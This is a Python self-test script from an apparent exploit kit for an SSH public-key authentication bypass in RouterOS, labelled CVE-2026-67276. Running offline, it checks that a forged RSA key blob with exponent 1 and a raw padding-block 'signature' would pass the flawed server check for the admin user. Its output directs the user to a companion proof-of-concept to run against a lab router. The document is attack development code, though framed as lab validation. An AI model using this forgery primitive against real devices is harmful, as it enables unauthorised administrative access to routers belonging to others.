"""
selftest.py - local proof of the CVE-2026-67276 forgery primitive.

Runs with NO router. `cryptography` is used only to
  (a) mint a throwaway "victim" key, and
  (b) produce an independent OpenSSL EMSA-PKCS1-v1_5 oracle: sign with the
      REAL private key, then invert the signature (sig^e mod n) so our
      encoder is compared against OpenSSL byte-for-byte.

Checks per signature algorithm (ssh-rsa / rsa-sha2-256 / rsa-sha2-512):
  1. our EMSA-PKCS1-v1_5 encoder == OpenSSL's (via real-signature inversion)
  2. forged blob {e=1, n} round-trips through the OpenSSH blob parser
  3. forged "signature" (raw EMSA block) verifies against exponent e=1
     - i.e. exactly what the RouterOS server computes with the flaw
  4. negative control: the same signature does NOT verify against the real
     exponent 65537 - forgery depends on the flaw, not on a broken encoder
  5. end-to-end wire sim: the exact RFC 4252 section 7 auth-data paramiko
     signs (session_id || USERAUTH_REQUEST || forged blob), verified at e=1
"""

import sys

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from forge_67276 import (
    emsa_pkcs1_v15,
    forged_public_blob,
    forged_signature,
    parse_openssh_rsa_pubkey,
    verify_pkcs1,
)

HASHES = {
    "ssh-rsa": hashes.SHA1(),
    "rsa-sha2-256": hashes.SHA256(),
    "rsa-sha2-512": hashes.SHA512(),
}

AUTH_DATA = b"mikrotrick-lab-selftest-v1"


def session_blob_shape(session_id: bytes, username: str, alg: str, key_blob: bytes) -> bytes:
    """Byte-exact reconstruction of paramiko AuthHandler._get_session_blob
    (RFC 4252 section 7 signed data): the string is what a server must
    EMSA-encode and compare against sig^e mod n."""
    import struct

    def s(b):
        return struct.pack(">I", len(b)) + b

    return (
        s(session_id)
        + b"\x32"  # SSH_MSG_USERAUTH_REQUEST (50)
        + s(username.encode())
        + s(b"ssh-connection")
        + s(b"publickey")
        + b"\x01"  # true
        + s(alg.encode())
        + s(key_blob)
    )


def parse_ssh_signature(sig_msg: bytes) -> int:
    """Extract the mpint signature integer from an SSH signature blob."""
    import struct

    (slen,) = struct.unpack_from(">I", sig_msg, 0)
    alg = sig_msg[4 : 4 + slen]
    off = 4 + slen
    (ilen,) = struct.unpack_from(">I", sig_msg, off)
    raw = sig_msg[off + 4 : off + 4 + ilen]
    assert alg == b"ssh-rsa" or alg.startswith(b"rsa-sha2-"), alg
    return int.from_bytes(raw, "big")


def main() -> int:
    victim = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    n = victim.public_key().public_numbers().n
    k = (n.bit_length() + 7) // 8
    session_id = b"\x11" * 32  # arbitrary but fixed KEX session id
    username = "admin"

    failures = 0
    for alg in ("ssh-rsa", "rsa-sha2-256", "rsa-sha2-512"):
        # 1. encoder vs OpenSSL oracle
        real_sig = victim.sign(AUTH_DATA, padding.PKCS1v15(), HASHES[alg])
        emsa_openssl = pow(int.from_bytes(real_sig, "big"), 65537, n).to_bytes(k, "big")
        mine = emsa_pkcs1_v15(AUTH_DATA, alg, k)
        t1 = mine == emsa_openssl

        # 2. forged blob round-trip
        # RFC 8332 changes the outer signature algorithm only. The public-key
        # blob for every RSA signature algorithm remains an ssh-rsa blob.
        n2, e2, _ = parse_openssh_rsa_pubkey(forged_public_blob("ssh-rsa", n))
        t2 = (n2, e2) == (n, 1)

        # 3. server-side verify math under disclosed behavior (e=1)
        sig_int = int.from_bytes(mine, "big")
        t3 = verify_pkcs1(n, 1, sig_int, AUTH_DATA, alg)

        # 4. negative control with the real exponent
        t4 = verify_pkcs1(n, 65537, sig_int, AUTH_DATA, alg) is False

        # 5. end-to-end wire sim
        blob = forged_public_blob("ssh-rsa", n)
        data = session_blob_shape(session_id, username, alg, blob)
        sig_int = parse_ssh_signature(forged_signature(data, alg, n))
        t5 = verify_pkcs1(n, 1, sig_int, data, alg)

        row = [
            ("emsa==openssl", t1),
            ("blob-roundtrip(e=1)", t2),
            ("verify(e=1)=VALID", t3),
            ("verify(e=65537)=INVALID", t4),
            ("wire-sim verify(e=1)=VALID", t5),
        ]
        status = "PASS" if all(v for _, v in row) else "FAIL"
        if status == "FAIL":
            failures += 1
        detail = "  ".join(f"{name}:{'ok' if v else 'BAD'}" for name, v in row)
        print(f"[{status}] {alg:<13} {detail}")

    print()
    if failures == 0:
        print("PRIMITIVE PROVEN: given the disclosed server behavior")
        print("(blob match ignores exponent; verify uses client-supplied key),")
        print("an attacker holding only the victim's RSA modulus forges a")
        print("signature that verifies at e=1. Run against a lab RouterOS")
        print("instance with poc_67276.py to confirm server behavior.")
        return 0
    print(f"{failures} algorithm(s) FAILED - do not trust the primitive.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
